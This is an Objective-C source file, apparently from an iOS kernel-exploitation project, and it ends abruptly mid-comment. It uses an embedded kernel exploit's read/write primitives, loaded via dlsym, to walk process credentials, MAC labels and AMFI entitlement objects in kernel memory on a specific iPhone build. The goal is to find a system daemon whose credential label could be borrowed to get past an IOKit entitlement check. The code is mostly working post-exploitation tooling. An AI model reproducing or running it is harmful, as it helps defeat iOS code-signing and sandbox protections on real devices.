#import "CNDPhysicalEntitlementAuditProbe.h"

#include <dlfcn.h>
#include <mach-o/loader.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/sysctl.h>

/*
 * Read-only AMFI entitlement audit for the IOUserEthernet route.
 *
 * Why this exists
 * ---------------
 * The IOUserEthernet kernel-call route needs an `IOServiceOpen` of
 * `IOUserEthernetResource` to succeed, and that open is gated on an entitlement
 * the app does not have:
 *
 *   com.apple.iokit.IOUserEthernet
 *     IOUserEthernetResourceUserClient::initWithTask(task, securityID, type)
 *     [kext __TEXT_EXEC, static 0xfffffff00ac787b4]
 *         blraa  super::initWithTask
 *         add    x23, "com.apple.networking.ethernet.user-access"
 *                        [kext __TEXT, static 0xfffffff007966f36]
 *         bl     IOTaskHasEntitlement(task, entitlement)
 *         cbz    w0 -> log "IOUE_UC:: %s entitlement missing"
 *                        [static 0xfffffff007966f60] and fail
 *
 * So the gate is evaluated against the *opening task*, at user-client
 * creation - which is exactly what the label borrow targets.  The donor choice
 * is corroborated offline too: com.apple.security.sandbox carries a profile
 * table naming `/usr/sbin/bluetoothd` together with
 * `IOUserEthernetResourceUserClient` / `IOUserEthernetResource`
 * (kernel-filesets-stock/com.apple.security.sandbox, file offset 0x192179).
 *
 * The borrow itself cannot land on this phone: the app's socket KRW returns
 * EFAULT writing the MAC-label object (confirmed on-device 2026-10-17:
 * labelWriteAccepted=false, labelWriteErrno=14, before/after label bytes
 * byte-identical; previously recorded by the CS allow-invalid probe).  What is
 * still unknown is whether the donor actually carries the entitlement, because
 * that is code-signature data in userspace, not something the kernelcache
 * holds.
 *
 * This probe answers only that, and does it without writing anything: it
 * resolves each candidate's credential label, reads the AMFI slot value out of
 * the label, and then follows the typed OSEntitlements chain to the DER blob
 * that actually holds the entitlement keys.  No label borrow, no writes, no
 * kernel call, no provider, no root, no host process - reads only, through the
 * app's own kexploit KRW.
 *
 * The pointer walk that used to do this is gone.  It read 0x400/0x80-byte
 * windows at every followed pointer and it produced both captured device panics
 * (docs/research/entitlement-audit-panic-20261018-iphone17,2.md).  The claim
 * that "reads of an unmapped address come back as zeroes" was wrong: they fault
 * the kernel, which is exactly what those two panics are.  So every address
 * read here now comes from a typed hop - a field offset taken from the app's own
 * offsets module, decoded (PAC / PUCL) and validated against the object window,
 * and cross-checked against proc_get_cred_label()'s device-proven answer -
 * before the next hop is taken.  The DER blob is streamed in 8-byte reads only,
 * under a hard cap, and every step is persisted (with the address about to be
 * read) before the read happens, so a fault is attributable from the report.
 */

enum {
    CNDPhysicalEntitlementAuditLabelSize = 0x20,
    CNDPhysicalEntitlementAuditAMFISlotOffset = 0x8,
    CNDPhysicalEntitlementAuditSandboxSlotOffset = 0x10,
};

#define CND_PHYSICAL_ENTITLEMENT_AUDIT_EXPECTED_PRODUCT "iPhone17,2"
#define CND_PHYSICAL_ENTITLEMENT_AUDIT_EXPECTED_BUILD "23A341"
#define CND_PHYSICAL_ENTITLEMENT_AUDIT_OBJECT_MIN \
    UINT64_C(0xffffffdc00000000)
#define CND_PHYSICAL_ENTITLEMENT_AUDIT_OBJECT_MAX \
    UINT64_C(0xfffffffbffffffff)
#define CND_PHYSICAL_ENTITLEMENT_AUDIT_SLIDE_MAX UINT64_C(0x100000000)

/* Typed chain offsets.  The four that the app already pins for this device come
 * from offsets.m via dlsym (so they are the same values kutils.m uses); these
 * are the AMFI read-only-data hops, which the app does not expose yet.
 *
 * RO_OFFSET is not a guess: the device's own AMFI image
 * (kernel-filesets-stock/com.apple.driver.AppleMobileFileIntegrity, same
 * kernelcache UUID as the phone) shows
 * `OSEntitlements::getReadOnlyData` = `ldr x17, [x0, #0x10]` and
 * `OSEntitlements::initReadOnlyData` = `ldr x8, [x19, #0x10]` /
 * `str x0, [x19, #0x10]`, i.e. the read-only-data pointer is the field at
 * +0x10.
 *
 * The fields *inside* that read-only object are derived from the same image
 * (all offsets are into the read-only element, all addresses into AMFI's
 * __TEXT_EXEC):
 *
 *   +0x00  the owning OSEntitlements.  `initReadOnlyData` writes it as the
 *          first thing it does - `zalloc_ro_mut(zone, ro, 0x0, &this, 8)`
 *          (0xfffffff00976e138) - and `getReadOnlyData` re-checks it before
 *          handing the object out: `ldr x9, [x16]; cmp x9, x19` with x19 =
 *          `this`, `b.ne` into a panic (0xfffffff00976e048).
 *   +0x08  a 0x48-byte CoreEntitlements context.  `initEntitlements` writes
 *          `ro+0x08 .. ro+0x50` in a single 0x48-byte `zalloc_ro_mut`
 *          (0xfffffff00976e1cc); `adjustWithoutMonitor`/`adjustWithMonitor`
 *          write the same span from the decoded query context.
 *   +0x10  the context's decoded-DER-item struct, 0x38 bytes, handed out by
 *          0xfffffff00977674c (`*out = ctx + 0x8`) and consumed by
 *          `createXMLBlob`'s block (0xfffffff009770100).  Its own +0x00 is the
 *          CEContext, +0x18 a 16-byte constant, +0x20 a 0x100 (0x101 when the
 *          decoded item is tag 2) type/flag word, +0x28 the DER begin and
 *          +0x30 the DER end - all written by 0xfffffff00977e43c.
 *   +0x38  DER begin (that struct's +0x28)  - `stp x10, x9, [x19, #0x20]`
 *   +0x40  DER end   (that struct's +0x30)  - `str x8, [x19, #0x30]`
 *   +0x50  `ro+0x08`, the address of that context.  `initEntitlements` writes
 *          it with `zalloc_ro_mut(..., 0x50, &(ro+0x08), 8)`
 *          (0xfffffff00976e1e4) and `createXMLBlob`'s block reads it first
 *          (`ldr x0, [x1, #0x50]`, 0xfffffff009770100) - the same hop this
 *          probe takes.
 *
 * The begin/end pair carries no alignment requirement.  0xfffffff00977e43c
 * takes both ends straight from the DER decoder's byte pointers and enforces
 * only their order (`cmp x9, x8; b.hi` -> brk, 0xfffffff00977e48c), so a DER
 * range may begin and end on any byte.  The gate below therefore band-tests
 * the pair instead of demanding 8-byte alignment; alignment is right for real
 * kernel objects, not for a byte range. */
#define CND_ENT_AUDIT_OSENTITLEMENTS_RO_OFFSET UINT64_C(0x10)
#define CND_ENT_AUDIT_OSENTITLEMENTS_OWNER_OFFSET UINT64_C(0x0)
#define CND_ENT_AUDIT_OSENTITLEMENTS_CONTEXT_OFFSET UINT64_C(0x50)
#define CND_ENT_AUDIT_OSENTITLEMENTS_DER_START_OFFSET UINT64_C(0x38)
#define CND_ENT_AUDIT_OSENTITLEMENTS_DER_END_OFFSET UINT64_C(0x40)
/* The decoded item's type/flag word, 0x100 (0x101 with bit 0 set) when the
 * item is a tag-2 collection; reported as corroboration, not gated. */
#define CND_ENT_AUDIT_OSENTITLEMENTS_DER_TYPE_OFFSET UINT64_C(0x30)
#define CND_ENT_AUDIT_DER_ITEM_TYPE_BASE UINT64_C(0x100)

/* The DER blob is streamed, never window-read: it is a right-sized allocation,
 * so a 32-byte transfer can cross its element boundary and trip the zone bounds
 * check (the captured `MAC Labels` panic shape).  8 bytes at a time only. */
#define CND_ENT_AUDIT_DER_CAP UINT64_C(0x4000)
#define CND_ENT_AUDIT_DER_PERSIST_EVERY UINT64_C(0x200)
#define CND_ENT_AUDIT_DER_SEARCH_EVERY UINT64_C(0x80)

#define CND_ENT_AUDIT_READ_BUDGET UINT64_C(40000)
#define CND_ENT_AUDIT_SAMPLE_STRINGS 8U
#define CND_ENT_AUDIT_SAMPLE_LENGTH 96U

/* iPhone17,2 23A341 pre-slide container __TEXT base, pinned by the producer. */
static const uint64_t CNDPhysicalEntitlementAuditStaticKernelBase =
    UINT64_C(0xfffffff007004000);

static const char *const CNDPhysicalEntitlementAuditRequiredEntitlement =
    "com.apple.networking.ethernet.user-access";

/* Near-miss probe: if a process carries a differently-spelled ethernet
 * entitlement (or the key is truncated in some blob), this catches it and the
 * sample strings say exactly what it holds. */
static const char *const CNDPhysicalEntitlementAuditRequiredEntitlementStem =
    "networking.ethernet";

/* bluetoothd first: it is the profile-table match and the design's donor.  The
 * rest are read-only fallbacks, recorded as not-running when absent. */
static const char *const CNDPhysicalEntitlementAuditCandidates[] = {
    "bluetoothd",
    "configd",
    "nehelper",
    "symptomsd",
    "wifid",
};

typedef uint64_t (*CNDPhysicalEntitlementAuditProcFindByNameFn)(
    const char *name);
typedef uint64_t (*CNDPhysicalEntitlementAuditProcSelfFn)(void);
typedef uint64_t (*CNDPhysicalEntitlementAuditProcGetCredLabelFn)(
    uint64_t proc);
typedef void (*CNDPhysicalEntitlementAuditKReadBufFn)(
    uint64_t address, void *buffer, uint64_t length);
typedef uint64_t (*CNDPhysicalEntitlementAuditKRead64Fn)(uint64_t address);
typedef uint64_t (*CNDPhysicalEntitlementAuditKReadSmrPtrFn)(
    uint64_t address);
typedef int (*CNDPhysicalEntitlementAuditKexploitFn)(void);
typedef bool (*CNDPhysicalEntitlementAuditKRWReadyFn)(void);
typedef bool (*CNDPhysicalEntitlementAuditKRWCleanupFn)(void);
typedef void (*CNDPhysicalEntitlementAuditOffsetsInitFn)(void);

typedef struct {
    CNDPhysicalEntitlementAuditProcFindByNameFn procFindByName;
    CNDPhysicalEntitlementAuditProcSelfFn procSelf;
    CNDPhysicalEntitlementAuditProcGetCredLabelFn procGetCredLabel;
    CNDPhysicalEntitlementAuditKReadBufFn kreadbuf;
    CNDPhysicalEntitlementAuditKRead64Fn kread64;
    CNDPhysicalEntitlementAuditKReadSmrPtrFn kreadSmrPtr;
    CNDPhysicalEntitlementAuditKexploitFn kexploit;
    CNDPhysicalEntitlementAuditKRWReadyFn krwReady;
    CNDPhysicalEntitlementAuditKRWCleanupFn krwCleanup;
    CNDPhysicalEntitlementAuditOffsetsInitFn offsetsInit;
    uint64_t *kernelBase;
    uint64_t *kernelSlide;
    uint32_t *amfiSlotOffset;
    uint32_t *sandboxSlotOffset;
    uint32_t *procPProcROOffset;
    uint32_t *procROPUcredOffset;
    uint32_t *ucredLabelOffset;
} CNDPhysicalEntitlementAuditKernelAPI;

typedef struct {
    uint64_t reads;
    bool found;
    bool stemFound;
    bool truncated;
    bool aborted;
    bool labelMatchesKutils;
    char matched[CND_ENT_AUDIT_SAMPLE_LENGTH + 1];
    char abortReason[CND_ENT_AUDIT_SAMPLE_LENGTH + 1];
    uint32_t sampleCount;
    char samples[CND_ENT_AUDIT_SAMPLE_STRINGS][CND_ENT_AUDIT_SAMPLE_LENGTH + 1];
    /* Typed chain evidence: every hop value is kept so a wrong decode is
     * diagnosable from the report instead of from another device run. */
    uint64_t procRO;
    uint64_t ucredRaw;
    uint64_t ucredSmr;
    uint64_t ucred;
    char ucredDecode[8];
    uint64_t labelRaw;
    uint64_t labelDataStrip;
    uint64_t labelInstrStrip;
    char labelDecode[16];
    uint64_t amfiSlotValue;
    uint64_t roObject;
    uint64_t roOwner;
    uint64_t roContext;
    bool roOwnerCheck;
    bool roContextCheck;
    uint64_t derStart;
    uint64_t derEnd;
    uint64_t derLength;
    uint64_t derBytesRead;
    uint64_t derKeyOffset;
    uint8_t derFirstByte;
    uint8_t entitlementValue[8];
    uint32_t entitlementValueLength;
} CNDPhysicalEntitlementAuditScan;

typedef struct {
    const char *name;
    uint64_t proc;
    uint64_t label;
    uint64_t amfiObject;
    uint64_t sandboxObject;
    uint8_t labelBytes[CNDPhysicalEntitlementAuditLabelSize];
    bool labelReadable;
    CNDPhysicalEntitlementAuditScan scan;
} CNDPhysicalEntitlementAuditTarget;

static volatile int32_t gCNDPhysicalEntitlementAuditProbeRunning;

/* Exact PAC strips, the same instructions the producer uses. */
__attribute__((naked))
static uint64_t CNDPhysicalEntitlementAuditStripData(uint64_t value)
{
    __asm__ volatile(".long 0xdac147e0"); /* xpacd x0 */
    __asm__ volatile("ret");
}

__attribute__((naked))
static uint64_t CNDPhysicalEntitlementAuditStripInstruction(uint64_t value)
{
    __asm__ volatile(".long 0xdac143e0"); /* xpaci x0 */
    __asm__ volatile("ret");
}

/* Band test only.  Used for the DER begin/end pair, which is a byte range
 * produced by the DER decoder and carries no alignment (see the +0x38/+0x40
 * note above); real kernel objects additionally need the alignment test. */
static bool CNDPhysicalEntitlementAuditObjectBand(uint64_t value)
{
    return value >= CND_PHYSICAL_ENTITLEMENT_AUDIT_OBJECT_MIN &&
        value <= CND_PHYSICAL_ENTITLEMENT_AUDIT_OBJECT_MAX;
}

static bool CNDPhysicalEntitlementAuditKernelObject(uint64_t value)
{
    return CNDPhysicalEntitlementAuditObjectBand(value) &&
        (value & UINT64_C(0x7)) == 0;
}

static NSString *CNDPhysicalEntitlementAuditHex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx",
        (unsigned long long)value];
}

static NSString *CNDPhysicalEntitlementAuditSysctlString(const char *name)
{
    char value[128] = {0};
    size_t size = sizeof(value);
    if (sysctlbyname(name, value, &size, NULL, 0) != 0 || value[0] == '\0') {
        return @"";
    }
    return [NSString stringWithUTF8String:value] ?: @"";
}

static NSString *CNDPhysicalEntitlementAuditHexBytes(
    const uint8_t *bytes, size_t length)
{
    NSMutableString *hex = [NSMutableString stringWithCapacity:length * 2];
    for (size_t index = 0; index < length; index++) {
        [hex appendFormat:@"%02x", bytes[index]];
    }
    return hex;
}

static void CNDPhysicalEntitlementAuditPersist(
    NSMutableDictionary<NSString *, id> *report, NSString *path,
    NSString *key, id value)
{
    if (key != nil && value != nil) report[key] = value;
    report[@"updatedAt"] = @([[NSDate date] timeIntervalSince1970]);
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
        options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys
        error:nil];
    if (data != nil && path != nil) {
        (void)[data writeToFile:path options:NSDataWritingAtomic error:nil];
    }
    if (key != nil) {
        NSLog(@"[CND_ENT_AUDIT] %@=%@", key, value);
    }
}

static bool CNDPhysicalEntitlementAuditResolveKernelAPI(
    CNDPhysicalEntitlementAuditKernelAPI *api)
{
    if (api == NULL) return false;
    memset(api, 0, sizeof(*api));
#define CND_ENT_AUDIT_RESOLVE(field, name) \
    api->field = (__typeof__(api->field))dlsym(RTLD_DEFAULT, name)
    CND_ENT_AUDIT_RESOLVE(procFindByName, "proc_find_by_name");
    CND_ENT_AUDIT_RESOLVE(procSelf, "proc_self");
    CND_ENT_AUDIT_RESOLVE(procGetCredLabel, "proc_get_cred_label");
    CND_ENT_AUDIT_RESOLVE(kreadbuf, "kreadbuf");
    CND_ENT_AUDIT_RESOLVE(kread64, "kread64");
    CND_ENT_AUDIT_RESOLVE(kreadSmrPtr, "kread_smrptr");
    CND_ENT_AUDIT_RESOLVE(kexploit, "kexploit_opa334");
    CND_ENT_AUDIT_RESOLVE(krwReady, "kexploit_krw_ready");
    CND_ENT_AUDIT_RESOLVE(krwCleanup, "kexploit_terminal_cleanup");
    CND_ENT_AUDIT_RESOLVE(offsetsInit, "offsets_init");
    CND_ENT_AUDIT_RESOLVE(kernelBase, "g_kernel_base");
    CND_ENT_AUDIT_RESOLVE(kernelSlide, "g_kernel_slide");
    CND_ENT_AUDIT_RESOLVE(amfiSlotOffset, "off_label_l_perpolicy_amfi");
    CND_ENT_AUDIT_RESOLVE(sandboxSlotOffset,
        "off_label_l_perpolicy_sandbox");
    CND_ENT_AUDIT_RESOLVE(procPProcROOffset, "off_proc_p_proc_ro");
    CND_ENT_AUDIT_RESOLVE(procROPUcredOffset, "off_proc_ro_p_ucred");
    CND_ENT_AUDIT_RESOLVE(ucredLabelOffset, "off_ucred_cr_label");
#undef CND_ENT_AUDIT_RESOLVE
    return api->procFindByName != NULL && api->procSelf != NULL &&
        api->procGetCredLabel != NULL && api->kreadbuf != NULL &&
        api->kread64 != NULL && api->kreadSmrPtr != NULL &&
        api->kexploit != NULL &&
        api->krwReady != NULL && api->krwCleanup != NULL &&
        api->offsetsInit != NULL &&
        api->kernelBase != NULL && api->kernelSlide != NULL &&
        api->amfiSlotOffset != NULL && api->sandboxSlotOffset != NULL &&
        api->procPProcROOffset != NULL && api->procROPUcredOffset != NULL &&
        api->ucredLabelOffset != NULL;
}

static bool CNDPhysicalEntitlementAuditReadBytes(
    const CNDPhysicalEntitlementAuditKernelAPI *api, uint64_t address,
    void *buffer, size_t length)
{
    if (api == NULL || api->kreadbuf == NULL || buffer == NULL ||
        length == 0) return false;
    api->kreadbuf(address, buffer, (uint64_t)length);
    return true;
}

static bool CNDPhysicalEntitlementAuditReadU64(
    const CNDPhysicalEntitlementAuditKernelAPI *api, uint64_t address,
    uint64_t *valueOut)
{
    if (valueOut == NULL) return false;
    *valueOut = 0;
    return CNDPhysicalEntitlementAuditReadBytes(api, address, valueOut,
        sizeof(*valueOut));
}

static size_t CNDPhysicalEntitlementAuditIndexOf(
    const uint8_t *haystack, size_t length, const char *needle)
{
    size_t needleLength = strlen(needle);
    if (haystack == NULL || needleLength == 0 || length < needleLength) {
        return SIZE_MAX;
    }
    for (size_t index = 0; index + needleLength <= length; index++) {
        if (haystack[index] == (uint8_t)needle[0] &&
            memcmp(haystack + index, needle, needleLength) == 0) {
            return index;
        }
    }
    return SIZE_MAX;
}

/* Keep a few `com.apple.` strings found while streaming the blob.  They are the
 * proof that the read really reached entitlement data, so an entitlementFound
 * =false verdict is meaningful rather than a chain that never got anywhere. */
static void CNDPhysicalEntitlementAuditNoteSamples(
    CNDPhysicalEntitlementAuditScan *scan, const uint8_t *bytes, size_t length)
{
    static const char prefix[] = "com.apple.";
    const size_t prefixLength = sizeof(prefix) - 1;
    if (scan == NULL || bytes == NULL) return;
    for (size_t index = 0; index + prefixLength < length; index++) {
        if (memcmp(bytes + index, prefix, prefixLength) != 0) continue;
        size_t end = index;
        while (end < length && end - index < CND_ENT_AUDIT_SAMPLE_LENGTH &&
            bytes[end] >= 0x20 && bytes[end] < 0x7f) {
            end++;
        }
        if (end - index <= prefixLength) { index = end; continue; }
        char sample[CND_ENT_AUDIT_SAMPLE_LENGTH + 1] = {0};
        memcpy(sample, bytes + index, end - index);
        bool duplicate = false;
        for (uint32_t slot = 0; slot < scan->sampleCount; slot++) {
            if (strcmp(scan->samples[slot], sample) == 0) {
                duplicate = true;
                break;
            }
        }
        if (!duplicate && scan->sampleCount < CND_ENT_AUDIT_SAMPLE_STRINGS) {
            snprintf(scan->samples[scan->sampleCount],
                sizeof(scan->samples[scan->sampleCount]), "%s", sample);
            scan->sampleCount++;
        }
        index = end;
    }
}

/*
 * Typed entitlement read.
 *
 * Six hops, each an 8-byte read of a field whose offset comes from the app's
 * own offsets module, each validated before the next is used, then the DER blob
 * streamed in 8-byte reads until the key is found or the cap is hit:
 *
 *   proc  --+off_proc_p_proc_ro--> proc_ro
 *         --+off_proc_ro_p_ucred--> ucred   (plain read AND kread_smrptr)
 *         --+off_ucred_cr_label--> label    (PAC decoded, and it must reproduce
 *                                           proc_get_cred_label()'s value)
 *   label --+off_label_l_perpolicy_amfi--> OSEntitlements
 *         --+0x10--> read-only data: +0x00 == the OSEntitlements it belongs to,
 *                    +0x50 == &+0x08, and +0x38/+0x40 are the DER start/end.
 *
 * Every read goes through the app's checked KRW path: `kread64`/`kreadbuf`
 * funnel into `early_kread64_checked`, which rejects any address outside the
 * kernel VA range (`is_kaddr_valid`, kexploit_opa334.m:1713, :1928) before a
 * transfer happens.  That gate is necessary but not sufficient: an in-range
 * *unmapped* address is exactly what the two captured faults were, which is why
 * every hop above must pass a structural check before the next address is
 * aimed at, and why a failed check aborts.  No windows, no graph, no recursion:
 * the walk this replaces had all three (its windows are what faulted).  See
 * docs/research/entitlement-audit-typed-read-design-20261018.md and
 * docs/research/entitlement-audit-panic-20261018-iphone17,2.md.
 */
static void CNDPhysicalEntitlementAuditTrail(
    NSMutableDictionary<NSString *, id> *report, NSString *reportPath,
    NSMutableDictionary<NSString *, id> *entry, NSString *stage,
    uint64_t nextAddress)
{
    if (entry == nil) return;
    entry[@"chainStage"] = stage;
    entry[@"nextReadAddress"] = CNDPhysicalEntitlementAuditHex(nextAddress);
    CNDPhysicalEntitlementAuditPersist(report, reportPath, nil, nil);
}

/* A failed self-check aborts the chain; it never becomes `found = false`.
 * "The chain did not verify" and "this process lacks the entitlement" are
 * different answers and must not be conflated. */
static void CNDPhysicalEntitlementAuditAbort(
    CNDPhysicalEntitlementAuditScan *scan,
    NSMutableDictionary<NSString *, id> *report, NSString *reportPath,
    NSMutableDictionary<NSString *, id> *entry, const char *reason)
{
    scan->aborted = true;
    snprintf(scan->abortReason, sizeof(scan->abortReason), "%s",
        reason != NULL ? reason : "");
    if (entry != nil) {
        NSString *text = [NSString stringWithUTF8String:scan->abortReason];
        entry[@"chainState"] = @"aborted";
        entry[@"chainAbortReason"] = text ?: @"";
    }
    CNDPhysicalEntitlementAuditPersist(report, reportPath, nil, nil);
}

static bool CNDPhysicalEntitlementAuditChainReadU64(
    const CNDPhysicalEntitlementAuditKernelAPI *api, uint64_t address,
    uint64_t *valueOut, CNDPhysicalEntitlementAuditScan *scan)
{
    if (!CNDPhysicalEntitlementAuditReadU64(api, address, valueOut)) {
        return false;
    }
    scan->reads++;
    return true;
}

/* Stream the DER blob in 8-byte reads.  It is a right-sized allocation, so a
 * wider transfer can cross the element boundary and trip the zone bounds check
 * (the shape of the captured `MAC Labels` panic). */
static void CNDPhysicalEntitlementAuditReadDER(
    const CNDPhysicalEntitlementAuditKernelAPI *api,
    CNDPhysicalEntitlementAuditTarget *target,
    NSMutableDictionary<NSString *, id> *report, NSString *reportPath,
    NSMutableDictionary<NSString *, id> *entry,
    const char *needle, const char *stem)
{
    CNDPhysicalEntitlementAuditScan *scan = &target->scan;
    uint8_t *buffer = calloc(1, (size_t)scan->derLength);
    if (buffer == NULL) {
        CNDPhysicalEntitlementAuditAbort(scan, report, reportPath, entry,
            "der-buffer-alloc");
        return;
    }
    uint64_t read = 0;
    while (read < scan->derLength) {
        if (scan->reads + 1 > CND_ENT_AUDIT_READ_BUDGET) {
            scan->truncated = true;
            break;
        }
        if (read % CND_ENT_AUDIT_DER_PERSIST_EVERY == 0) {
            entry[@"derBytesRead"] = @(read);
            CNDPhysicalEntitlementAuditTrail(report, reportPath, entry,
                @"der-stream", scan->derStart + read);
        }
        uint64_t value = 0;
        if (!CNDPhysicalEntitlementAuditChainReadU64(api, scan->derStart + read,
                &value, scan)) {
            CNDPhysicalEntitlementAuditAbort(scan, report, reportPath, entry,
                "der-read");
            break;
        }
        memcpy(buffer + read, &value, sizeof(value));
        read += sizeof(value);
        if (read == sizeof(value)) scan->derFirstByte = buffer[0];
        if (read % CND_ENT_AUDIT_DER_SEARCH_EVERY != 0 &&
            read != scan->derLength) {
            continue;
        }
        size_t used = (size_t)read;
        size_t key = CNDPhysicalEntitlementAuditIndexOf(buffer, used, needle);
        if (key != SIZE_MAX) {
            scan->found = true;
            scan->stemFound = true;
            snprintf(scan->matched, sizeof(scan->matched), "%s", needle);
            scan->derKeyOffset = (uint64_t)key;
            size_t start = key + strlen(needle);
            uint32_t length = 0;
            while (length < sizeof(scan->entitlementValue) &&
                   start + length < used) {
                scan->entitlementValue[length] = buffer[start + length];
                length++;
            }
            scan->entitlementValueLength = length;
            scan->derBytesRead = read;
            CNDPhysicalEntitlementAuditNoteSamples(scan, buffer, used);
            break;
        }
        if (stem != NULL) {
            key = CNDPhysicalEntitlementAuditIndexOf(buffer, used, stem);
            if (key != SIZE_MAX) {
                scan->stemFound = true;
                scan->derKeyOffset = (uint64_t)key;
            }
        }
        CNDPhysicalEntitlementAuditNoteSamples(scan, buffer, used);
    }
    scan->derBytesRead = read;
    free(buffer);
}

static bool CNDPhysicalEntitlementAuditReadChain(
    const CNDPhysicalEntitlementAuditKernelAPI *api,
    CNDPhysicalEntitlementAuditTarget *target,
    NSMutableDictionary<NSString *, id> *report, NSString *reportPath,
    NSMutableDictionary<NSString *, id> *entry,
    const char *needle, const char *stem)
{
    CNDPhysicalEntitlementAuditScan *scan = &target->scan;
    const uint32_t offProcRO = *api->procPProcROOffset;
    const uint32_t offUcred = *api->procROPUcredOffset;
    const uint32_t offLabel = *api->ucredLabelOffset;

    entry[@"chainState"] = @"typed-read";
    entry[@"chainOffsets"] = @{
        @"proc_p_proc_ro": @(offProcRO),
        @"proc_ro_p_ucred": @(offUcred),
        @"ucred_cr_label": @(offLabel),
        @"label_l_perpolicy_amfi": @(*api->amfiSlotOffset),
        @"osentitlements_read_only":
            @(CND_ENT_AUDIT_OSENTITLEMENTS_RO_OFFSET),
        @"osentitlements_der_start":
            @(CND_ENT_AUDIT_OSENTITLEMENTS_DER_START_OFFSET),
        @"osentitlements_der_end":
            @(CND_ENT_AUDIT_OSENTITLEMENTS_DER_END_OFFSET),
    };

    /* hop 1: proc -> proc_ro */
    CNDPhysicalEntitlementAuditTrail(report, reportPath, entry, @"proc-ro",
        target->proc + offProcRO);
    if (!CNDPhysicalEntitlementAuditChainReadU64(api, target->proc + offProcRO,
            &scan->procRO, scan)) {
        CNDPhysicalEntitlementAuditAbort(scan, report, reportPath, entry,
            "proc-ro-read");
        return false;
    }
    entry[@"procRO"] = CNDPhysicalEntitlementAuditHex(scan->procRO);
    if (!CNDPhysicalEntitlementAuditKernelObject(scan->procRO)) {
        CNDPhysicalEntitlementAuditAbort(scan, report, reportPath, entry,
            "proc-ro-not-object");
        return false;
    }

    /* hop 2: proc_ro -> ucred.  The plain read is what kutils.m does and is
     * device-proven; kread_smrptr is decoded alongside because the header
     * declares this field SMR.  Whichever lands in the object window is used,
     * and the report says which one did. */
    CNDPhysicalEntitlementAuditTrail(report, reportPath, entry, @"ucred",
        scan->procRO + offUcred);
    if (!CNDPhysicalEntitlementAuditChainReadU64(api, scan->procRO + offUcred,
            &scan->ucredRaw, scan)) {
        CNDPhysicalEntitlementAuditAbort(scan, report, reportPath, entry,
            "ucred-read");
        return false;
    }
    scan->ucredSmr = api->kreadSmrPtr(scan->procRO + offUcred);
    scan->reads++;
    if (CNDPhysicalEntitlementAuditKernelObject(scan->ucredRaw)) {
        scan->ucred = scan->ucredRaw;
        snprintf(scan->ucredDecode, sizeof(scan->ucredDecode), "%s", "plain");
    } else if (CNDPhysicalEntitlementAuditKernelObject(scan->ucredSmr)) {
        scan->ucred = scan->ucredSmr;
        snprintf(scan->ucredDecode, sizeof(scan->ucredDecode), "%s", "smr");
    }
    entry[@"ucredRaw"] = CNDPhysicalEntitlementAuditHex(scan->ucredRaw);
    entry[@"ucredSmr"] = CNDPhysicalEntitlementAuditHex(scan->ucredSmr);
    entry[@"ucredDecode"] = [NSString stringWithUTF8String:scan->ucredDecode];
    if (scan->ucred == 0) {
        CNDPhysicalEntitlementAuditAbort(scan, report, reportPath, entry,
            "ucred-not-object");
        return false;
    }

    /* hop 3: ucred -> label, decoded.  Self-check hop: proc_get_cred_label()
     * already produced `target->label` through these same fields, so the chain
     * only continues if it reproduces that device-proven value.  kutils.m
     * decodes this field with xpaci (`kread_ptr`, krw.m:145), so the
     * instruction strip is the decode that must match - but the data strip and
     * the untouched raw value are accepted too, because the anchor is the
     * equality with the device-proven label, not the choice of modifier.
     *
     * The offset and the signedness are both corroborated from the device's own
     * AMFI image: `getOSEntitlements` loads this field as `ldr x16, [x0, #0x78]`
     * and authenticates it with `autda x16, x17` where
     * `x17 = (ucred + 0x78) | 0x8b90 << 48`.  The strip instructions do not
     * authenticate, so the anchor - not the decode - is what catches a wrong
     * value. */
    CNDPhysicalEntitlementAuditTrail(report, reportPath, entry, @"label",
        scan->ucred + offLabel);
    if (!CNDPhysicalEntitlementAuditChainReadU64(api, scan->ucred + offLabel,
            &scan->labelRaw, scan)) {
        CNDPhysicalEntitlementAuditAbort(scan, report, reportPath, entry,
            "label-read");
        return false;
    }
    scan->labelDataStrip = CNDPhysicalEntitlementAuditStripData(scan->labelRaw);
    scan->labelInstrStrip =
        CNDPhysicalEntitlementAuditStripInstruction(scan->labelRaw);
    uint64_t derived = 0;
    if (scan->labelRaw == target->label) {
        derived = scan->labelRaw;
        snprintf(scan->labelDecode, sizeof(scan->labelDecode), "%s", "raw");
    } else if (scan->labelInstrStrip == target->label) {
        derived = scan->labelInstrStrip;
        snprintf(scan->labelDecode, sizeof(scan->labelDecode), "%s", "xpaci");
    } else if (scan->labelDataStrip == target->label) {
        derived = scan->labelDataStrip;
        snprintf(scan->labelDecode, sizeof(scan->labelDecode), "%s", "xpacd");
    } else if (CNDPhysicalEntitlementAuditKernelObject(
                   scan->labelInstrStrip)) {
        derived = scan->labelInstrStrip;
        snprintf(scan->labelDecode, sizeof(scan->labelDecode), "%s",
            "xpaci-nomatch");
    } else if (CNDPhysicalEntitlementAuditKernelObject(scan->labelDataStrip)) {
        derived = scan->labelDataStrip;
        snprintf(scan->labelDecode, sizeof(scan->labelDecode), "%s",
            "xpacd-nomatch");
    }
    entry[@"labelRaw"] = CNDPhysicalEntitlementAuditHex(scan->labelRaw);
    entry[@"labelInstrStrip"] =
        CNDPhysicalEntitlementAuditHex(scan->labelInstrStrip);
    entry[@"labelDataStrip"] =
        CNDPhysicalEntitlementAuditHex(scan->labelDataStrip);
    entry[@"labelDecode"] = [NSString stringWithUTF8String:scan->labelDecode]
        ?: @"";
    entry[@"labelDerived"] = CNDPhysicalEntitlementAuditHex(derived);
    entry[@"labelFromKutils"] = CNDPhysicalEntitlementAuditHex(target->label);
    scan->labelMatchesKutils = derived != 0 && derived == target->label;
    entry[@"labelMatchesKutils"] = @(scan->labelMatchesKutils);
    if (!scan->labelMatchesKutils) {
        CNDPhysicalEntitlementAuditAbort(scan, report, reportPath, entry,
            "label-chain-mismatch");
        return false;
    }

    /* hop 4: label -> AMFI slot.  That value came out of the label window the
     * caller already read, so this hop adds no read at a new address. */
    if (!CNDPhysicalEntitlementAuditKernelObject(scan->amfiSlotValue)) {
        CNDPhysicalEntitlementAuditAbort(scan, report, reportPath, entry,
            "amfi-slot-not-object");
        return false;
    }

    /* hop 5: OSEntitlements -> read-only data, gated on the two
     * self-referential fields.  This is what makes the DER offsets safe on a
